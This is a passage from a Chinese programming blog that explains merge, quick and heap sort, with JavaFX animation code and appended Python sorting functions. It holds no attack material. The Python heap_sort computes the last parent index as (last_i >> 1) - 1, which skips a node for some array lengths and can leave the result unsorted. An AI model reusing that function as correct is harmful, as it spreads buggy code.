class_\">int</span>[data.length];</span><br><span class=\"line\">    System.out.println(Arrays.toString(data));</span><br><span class=\"line\">    <span class=\"comment\">//递归调用</span></span><br><span class=\"line\">    sortRecursive(data, tmpArr, <span class=\"number\">0</span>, tmpArr.length - <span class=\"number\">1</span>);</span><br><span class=\"line\">    System.out.println(Arrays.toString(data));</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">    * <span class=\"doctag\">@param</span> data 原数组</span></span><br><span class=\"line\"><span class=\"comment\">    * <span class=\"doctag\">@param</span> result 临时数组</span></span><br><span class=\"line\"><span class=\"comment\">    * <span class=\"doctag\">@param</span> start 数组排序开始索引</span></span><br><span class=\"line\"><span class=\"comment\">    * <span class=\"doctag\">@param</span> end 数组排序结束索引</span></span><br><span class=\"line\"><span class=\"comment\">    * <span class=\"doctag\">@throws</span> Exception</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sortRecursive</span><span class=\"params\">(<span class=\"type\">int</span>[] data, <span class=\"type\">int</span>[] result, <span class=\"type\">int</span> start, <span class=\"type\">int</span> end)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"comment\">//如果开始索引大于结束索引，表示已经拆分为最小了，直接返回</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (start &gt;= end)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//计算数组中间值，用于拆分排序</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">mid</span> <span class=\"operator\">=</span> ((end - start) &gt;&gt; <span class=\"number\">1</span>) + start;</span><br><span class=\"line\">    <span class=\"comment\">//拆分数组起始值为start ~ mid  | mid + 1 ~ end</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">start1</span> <span class=\"operator\">=</span> start, end1 = mid;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">start2</span> <span class=\"operator\">=</span> mid + <span class=\"number\">1</span>, end2 = end;</span><br><span class=\"line\">    <span class=\"comment\">//对拆分的数组进行递归拆分排序</span></span><br><span class=\"line\">    sortRecursive(data, result, start1, end1);</span><br><span class=\"line\">    sortRecursive(data, result, start2, end2);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//这里表示递归拆分完毕，开始排序</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> start;</span><br><span class=\"line\">    <span class=\"comment\">//先两个数组取值</span></span><br><span class=\"line\">    Rectangle rectangle;</span><br><span class=\"line\">    <span class=\"comment\">//排序拆分的两个数组，核心原理就是从数组中取值比较后放入临时数组</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (start1 &lt;= end1 &amp;&amp; start2 &lt;= end2)&#123;</span><br><span class=\"line\">        <span class=\"comment\">//下面逻辑可以写为如下的一句话，为了图形展示，进行了拆分</span></span><br><span class=\"line\"><span class=\"comment\">//            result[i++] = data[start1] &lt;= data[start2]? data[start1++]: data[start2++];</span></span><br><span class=\"line\">        <span class=\"comment\">//如果左侧值&lt;=右侧的值，那么取左侧值到临时数组中，同时左侧角标+1，表示标记左侧取值索引</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (data[start1] &lt;= data[start2])&#123;</span><br><span class=\"line\">            rectangle = rectangles[start1];</span><br><span class=\"line\">            result[i] = data[start1];</span><br><span class=\"line\">            tmpRectangles[i] = rectangles[start1];</span><br><span class=\"line\">            start1++;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//否则取右侧的值，同时右侧角标+1</span></span><br><span class=\"line\">            rectangle = rectangles[start2];</span><br><span class=\"line\">            result[i] = data[start2];</span><br><span class=\"line\">            tmpRectangles[i] = rectangles[start2];</span><br><span class=\"line\">            start2++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//移动到上面，重新确定位置</span></span><br><span class=\"line\">        rectangle.setFill(Color.RED);</span><br><span class=\"line\">        TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">        AnchorPane.setBottomAnchor(rectangle, anchorPane.getHeight()/<span class=\"number\">2</span>);</span><br><span class=\"line\">        TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">        AnchorPane.setLeftAnchor(rectangle, BORDER_WIDTH * (i + <span class=\"number\">1</span>) + i * rectangle.getWidth());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//临时数组存入的值+1，表示已经存入的值位置</span></span><br><span class=\"line\">        i++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//这里如果第二个数组取值完毕，把数组1中值全部移动到临时数组中</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (start1 &lt;= end1)&#123;</span><br><span class=\"line\">        rectangle = rectangles[start1];</span><br><span class=\"line\"></span><br><span class=\"line\">        result[i] = data[start1];</span><br><span class=\"line\">        tmpRectangles[i] = rectangles[start1];</span><br><span class=\"line\"></span><br><span class=\"line\">        rectangle.setFill(Color.RED);</span><br><span class=\"line\">        TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">        AnchorPane.setBottomAnchor(rectangle, anchorPane.getHeight()/<span class=\"number\">2</span>);</span><br><span class=\"line\">        TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">        AnchorPane.setLeftAnchor(rectangle, BORDER_WIDTH * (i + <span class=\"number\">1</span>) + i * rectangle.getWidth());</span><br><span class=\"line\"></span><br><span class=\"line\">        i++;</span><br><span class=\"line\">        start1++;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//这里表示如果第一个数组取值完毕，把数组2中值全部移动到临时数组中</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (start2 &lt;= end2)&#123;</span><br><span class=\"line\">        rectangle = rectangles[start2];</span><br><span class=\"line\"></span><br><span class=\"line\">        result[i] = data[start2];</span><br><span class=\"line\">        tmpRectangles[i] = rectangles[start2];</span><br><span class=\"line\"></span><br><span class=\"line\">        rectangle.setFill(Color.RED);</span><br><span class=\"line\">        TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">        AnchorPane.setBottomAnchor(rectangle, anchorPane.getHeight()/<span class=\"number\">2</span>);</span><br><span class=\"line\">        TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">        AnchorPane.setLeftAnchor(rectangle, BORDER_WIDTH * (i + <span class=\"number\">1</span>) + i * rectangle.getWidth());</span><br><span class=\"line\"></span><br><span class=\"line\">        i++;</span><br><span class=\"line\">        start2++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//把临时数组中数据移动到原数组中</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">j</span> <span class=\"operator\">=</span> start; j &lt;= end; j++) &#123;</span><br><span class=\"line\">        data[j] = result[j];</span><br><span class=\"line\">        rectangles[j] = tmpRectangles[j];</span><br><span class=\"line\">        rectangle = rectangles[j];</span><br><span class=\"line\">        TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">        rectangle.setFill(Color.YELLOW);</span><br><span class=\"line\">        AnchorPane.setBottomAnchor(rectangle, <span class=\"number\">0d</span>);</span><br><span class=\"line\">        AnchorPane.setLeftAnchor(rectangle, BORDER_WIDTH * (j + <span class=\"number\">1</span>) + j * rectangle.getWidth());</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>并归代码中无关代码较多。很多图形移动的逻辑。需要进行进一步封装。</p>\n<p>上述代码中就是通过不断的拆分数组，然后对拆分的数组进行排序，只对排序的数组进一步排序直到结束。其中一部分逻辑就是从已经排序好的两个数组进行合并，也就简单的从两个数组中取值进行比较，直到某个数组值取值完毕，然后对移动另一个数组中的数剧到末尾。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLWhhbnMvJUU1JUJEJTkyJUU1JUI5JUI2JUU2JThFJTkyJUU1JUJBJThG\">wikipedia·归并排序<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"快速排序\"><a href=\"#快速排序\" class=\"headerlink\" title=\"快速排序\"></a>快速排序</h3><p>快速排序基本原理是，先从数组中随机找一个基准，然后把小于改基准的值放入左边，大于改基准的值放入右边。然后对左右两边的数组进行递归同样的方法，找到随机值，小的放到左边，大的放到右边。</p>\n<p><img src=\"/images/old/20180504quicksort.gif\"><br>图中，黑色表示基准，先把获取的基准放入最右边，从左到右遍历，记录放入左侧的位置，如果遍历过程中值小于基准值，那么把该值替换到左侧记录的位置，位置左移，继续遍历，直到末尾，把基准插入左侧记录的位置。继续递归，直到结束。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sort</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    System.out.println(Arrays.toString(data));</span><br><span class=\"line\">    <span class=\"comment\">//开始排序</span></span><br><span class=\"line\">    sort(data, <span class=\"number\">0</span>, data.length - <span class=\"number\">1</span>);</span><br><span class=\"line\">    System.out.println(Arrays.toString(data));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">    *</span></span><br><span class=\"line\"><span class=\"comment\">    * <span class=\"doctag\">@param</span> data 排序数组</span></span><br><span class=\"line\"><span class=\"comment\">    * <span class=\"doctag\">@param</span> leftIndex 数组左侧索引</span></span><br><span class=\"line\"><span class=\"comment\">    * <span class=\"doctag\">@param</span> rightIndex 右侧索引</span></span><br><span class=\"line\"><span class=\"comment\">    * <span class=\"doctag\">@throws</span> Exception</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sort</span><span class=\"params\">(<span class=\"type\">int</span>[] data, <span class=\"type\">int</span> leftIndex, <span class=\"type\">int</span> rightIndex)</span><span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">    <span class=\"comment\">//如果支持索引大于右侧索引，表已经递归结束</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (leftIndex &gt;= rightIndex)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (rightIndex &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            rectangles[leftIndex].setFill(Color.YELLOW);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            rectangles[rightIndex].setFill(Color.YELLOW);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//获取基准索引，存储采用的事中间值，也可以采用随机数</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">pivot</span> <span class=\"operator\">=</span> (leftIndex + rightIndex)/<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"comment\">//交换基准元素到最后</span></span><br><span class=\"line\">    rectangles[pivot].setFill(Color.BLACK);</span><br><span class=\"line\">    SortUtils.changeData(data, rectangles, pivot, rightIndex, <span class=\"number\">200</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//记录交换索引的位置，用于交换小于基准的值，默认为最左侧索引</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">swapIndex</span> <span class=\"operator\">=</span> leftIndex;</span><br><span class=\"line\">    <span class=\"comment\">//从左遍历到右</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> leftIndex; i &lt; rightIndex; i++) &#123;</span><br><span class=\"line\">        rectangles[i].setFill(Color.RED);</span><br><span class=\"line\">        TimeUnit.MILLISECONDS.sleep(<span class=\"number\">200</span>);</span><br><span class=\"line\">        <span class=\"comment\">//如果遍历的值小于基准，那么把该值交换到之前记录的左侧索引位置，然后索引位置+1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (data[i] &lt;= data[rightIndex])&#123;</span><br><span class=\"line\">            SortUtils.changeData(data, rectangles, swapIndex, i, <span class=\"number\">200</span>);</span><br><span class=\"line\">            rectangles[i].setFill(Color.RED);</span><br><span class=\"line\">            rectangles[swapIndex].setFill(Color.BLUE);</span><br><span class=\"line\">            swapIndex++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        rectangles[i].setFill(Color.BLUE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//一次遍历完成后，把最右侧的值（基准）替换到记录的索引位置，此时，左侧数据&lt;=基准，右侧&gt;基准</span></span><br><span class=\"line\">    SortUtils.changeData(data, rectangles, swapIndex, rightIndex, <span class=\"number\">200</span>);</span><br><span class=\"line\">    rectangles[swapIndex].setFill(Color.YELLOW);</span><br><span class=\"line\">    <span class=\"comment\">//递归基准左右两侧数组</span></span><br><span class=\"line\">    sort(data, leftIndex, swapIndex - <span class=\"number\">1</span>);</span><br><span class=\"line\">    sort(data, swapIndex + <span class=\"number\">1</span>, rightIndex);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLyVFNSVCRiVBQiVFOSU4MCU5RiVFNiU4RSU5MiVFNSVCQSU4Rg==\">wikipedia·快速排序<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"堆排序\"><a href=\"#堆排序\" class=\"headerlink\" title=\"堆排序\"></a>堆排序</h3><p>堆排序的要点在于，先对数组构造一个<code>完全二叉树</code>，之后对二叉树取最高点，之后重新构造二叉树，重复上述步骤，直到取值完毕。<br>需要用的的知识点：</p>\n<ul>\n<li>父节点i的左子节点在位置 <code>(2i+1)</code>;</li>\n<li>父节点i的右子节点在位置 <code>(2i+2)</code>;</li>\n<li>子节点i的父节点在位置 <code>floor((i-1)/2)</code>;</li>\n</ul>\n<p><img src=\"/images/old/20180504heapsort.gif\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//用于方便画图</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">GraphVo</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> num;</span><br><span class=\"line\">    StackPane stackPane;</span><br><span class=\"line\">    Text text;</span><br><span class=\"line\">    Circle circle;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">GraphVo[] graphVos;</span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sort</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"comment\">//获取最后的索引</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">lastIndex</span> <span class=\"operator\">=</span> graphVos.length - <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"comment\">//计算最后一个父节点，因为不需要从子节点开始</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">lastParentIndex</span> <span class=\"operator\">=</span> lastIndex &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">    toStr();</span><br><span class=\"line\">    <span class=\"comment\">//构造一个最大二叉堆</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> lastParentIndex; i &gt;= <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">        maxHeap(i, lastIndex);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (GraphVo graphVo : graphVos) &#123;</span><br><span class=\"line\">        graphVo.circle.setFill(Color.AZURE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    TimeUnit.SECONDS.sleep(<span class=\"number\">2</span>);</span><br><span class=\"line\">    toStr();</span><br><span class=\"line\">    <span class=\"comment\">//从二叉堆中取值，放入数组末尾，之后重新构造新的最大二叉堆</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> lastIndex; i &gt;= <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">        graphVos[<span class=\"number\">0</span>].circle.setFill(Color.YELLOW);</span><br><span class=\"line\">        <span class=\"comment\">//交换第一个到末尾</span></span><br><span class=\"line\">        swap(<span class=\"number\">0</span>, i);</span><br><span class=\"line\">        <span class=\"comment\">//重新构造最大二叉堆，已经交换到末尾的数除外，因为根节点已经变更，所以需要重新从根节点构造二叉堆</span></span><br><span class=\"line\">        maxHeap(<span class=\"number\">0</span>, i - <span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    toStr();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">maxHeap</span><span class=\"params\">(<span class=\"type\">int</span> parentIndex, <span class=\"type\">int</span> lastIndex)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"comment\">//计算父节点左节点 2 * i + 1</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">leftI</span> <span class=\"operator\">=</span> (parentIndex &lt;&lt; <span class=\"number\">1</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"comment\">//计算父节点右节点</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">rightI</span> <span class=\"operator\">=</span> leftI + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"comment\">//如果左节点已经超过最大索引，那么返回，表示已经是最后一个父节点了</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (leftI &gt; lastIndex) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"comment\">//知道左右索引最大值，默认为左侧索引</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">maxIndex</span> <span class=\"operator\">=</span> leftI;</span><br><span class=\"line\">    <span class=\"comment\">//如果右侧索引没超过最大索引，且右侧的值为最大值，那么最大值索引为右边</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (rightI &lt;= lastIndex &amp;&amp; graphVos[rightI].num &gt; graphVos[leftI].num) &#123;</span><br><span class=\"line\">        maxIndex = rightI;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    graphVos[parentIndex].circle.setFill(Color.RED);</span><br><span class=\"line\">    TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">    <span class=\"comment\">//比较父节点和最大子节点值，如果子节点大，那么需要交换父子节点，</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (graphVos[maxIndex].num &gt; graphVos[parentIndex].num) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        swap(maxIndex, parentIndex);</span><br><span class=\"line\">        <span class=\"comment\">//因为父节点发生了变动，那么变动的子节点需要重新构造二叉堆，继续向下构造</span></span><br><span class=\"line\">        maxHeap(maxIndex, lastIndex);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>附赠python3的排序</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bubble_sort</span>(<span class=\"params\">nums</span>):</span><br><span class=\"line\">    end_index = <span class=\"built_in\">len</span>(nums) - <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(end_index, <span class=\"number\">0</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, i):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> nums[j] &gt; nums[j + <span class=\"number\">1</span>]:</span><br><span class=\"line\">                nums[j], nums[j + <span class=\"number\">1</span>] = nums[j + <span class=\"number\">1</span>], nums[j]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nums</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">select_sort</span>(<span class=\"params\">nums</span>):</span><br><span class=\"line\">    end_index = <span class=\"built_in\">len</span>(nums) - <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(end_index, <span class=\"number\">0</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">        max_index = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, i):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> nums[j + <span class=\"number\">1</span>] &gt; nums[max_index]:</span><br><span class=\"line\">                max_index = j + <span class=\"number\">1</span></span><br><span class=\"line\">        nums[i], nums[max_index] = nums[max_index], nums[i]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nums</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">insert_sort</span>(<span class=\"params\">nums</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(nums)):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i, <span class=\"number\">0</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> nums[j] &lt; nums[j - <span class=\"number\">1</span>]:</span><br><span class=\"line\">                nums[j], nums[j - <span class=\"number\">1</span>] = nums[j - <span class=\"number\">1</span>], nums[j]</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> nums</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">merge_sort</span>(<span class=\"params\">nums</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">merge_re</span>(<span class=\"params\">nums, tmp_nums, start, end</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> start &gt;= end:</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        mid = (start + end) &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        merge_re(nums, tmp_nums, start, mid)</span><br><span class=\"line\">        merge_re(nums, tmp_nums, mid + <span class=\"number\">1</span>, end)</span><br><span class=\"line\"></span><br><span class=\"line\">        left = start</span><br><span class=\"line\">        right = mid + <span class=\"number\">1</span></span><br><span class=\"line\">        tmp_i = left</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> left &lt;= mid <span class=\"keyword\">and</span> right &lt;= end:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> nums[left] &lt;= nums[right]:</span><br><span class=\"line\">                    tmp_nums[tmp_i] = nums[left]</span><br><span class=\"line\">                    left += <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    tmp_nums[tmp_i] = nums[right]</span><br><span class=\"line\">                    right += <span class=\"number\">1</span></span><br><span class=\"line\">                tmp_i += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> left &lt;= mid:</span><br><span class=\"line\">                tmp_nums[tmp_i] = nums[left]</span><br><span class=\"line\">                left += <span class=\"number\">1</span></span><br><span class=\"line\">                tmp_i += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> right &lt;= end:</span><br><span class=\"line\">                tmp_nums[tmp_i] = nums[right]</span><br><span class=\"line\">                right += <span class=\"number\">1</span></span><br><span class=\"line\">                tmp_i += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(start, end + <span class=\"number\">1</span>):</span><br><span class=\"line\">            nums[i] = tmp_nums[i]</span><br><span class=\"line\"></span><br><span class=\"line\">    merge_re(nums, [<span class=\"number\">0</span>] * <span class=\"built_in\">len</span>(nums), <span class=\"number\">0</span>, <span class=\"built_in\">len</span>(nums) - <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nums</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">quick_sort</span>(<span class=\"params\">nums</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">quick_re</span>(<span class=\"params\">nums, left, right</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> left &gt;= right:</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        mid = (right + left) &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        nums[mid], nums[right] = nums[right], nums[mid]</span><br><span class=\"line\">        mid = left</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(left, right):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> nums[i] &lt;= nums[right]:</span><br><span class=\"line\">                nums[mid], nums[i] = nums[i], nums[mid]</span><br><span class=\"line\">                mid += <span class=\"number\">1</span></span><br><span class=\"line\">        nums[mid], nums[right] = nums[right], nums[mid]</span><br><span class=\"line\">        quick_re(nums, left, mid - <span class=\"number\">1</span>)</span><br><span class=\"line\">        quick_re(nums, mid + <span class=\"number\">1</span>, right)</span><br><span class=\"line\"></span><br><span class=\"line\">    quick_re(nums, <span class=\"number\">0</span>, <span class=\"built_in\">len</span>(nums) - <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nums</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">heap_sort</span>(<span class=\"params\">nums</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">max_heap</span>(<span class=\"params\">nums, parent, last</span>):</span><br><span class=\"line\">        left = (parent &lt;&lt; <span class=\"number\">1</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">        right = left + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> left &gt; last:</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        max_i = left</span><br><span class=\"line\">        <span class=\"keyword\">if</span> right &lt;= last <span class=\"keyword\">and</span> nums[right] &gt; nums[left]:</span><br><span class=\"line\">            max_i = right</span><br><span class=\"line\">        <span class=\"keyword\">if</span> nums[parent] &lt; nums[max_i]:</span><br><span class=\"line\">            nums[parent], nums[max_i] = nums[max_i], nums[parent]</span><br><span class=\"line\">            max_heap(nums, max_i, last)</span><br><span class=\"line\"></span><br><span class=\"line\">    last_i = <span class=\"built_in\">len</span>(nums) - <span class=\"number\">1</span></span><br><span class=\"line\">    last_p = (last_i &gt;&gt; <span class=\"number\">1</span>) - <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(last_p, -<span class=\"number\">1</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">        max_heap(nums, i, last_i)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(last_i, <span class=\"number\">0</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">        nums[<span class=\"number\">0</span>], nums[i] = nums[i], nums[<span class=\"number\">0</span>]</span><br><span class=\"line\">        max_heap(nums, <span class=\"number\">0</span>, i - <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nums</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">random_int_list</span>(<span class=\"params\">start, stop, 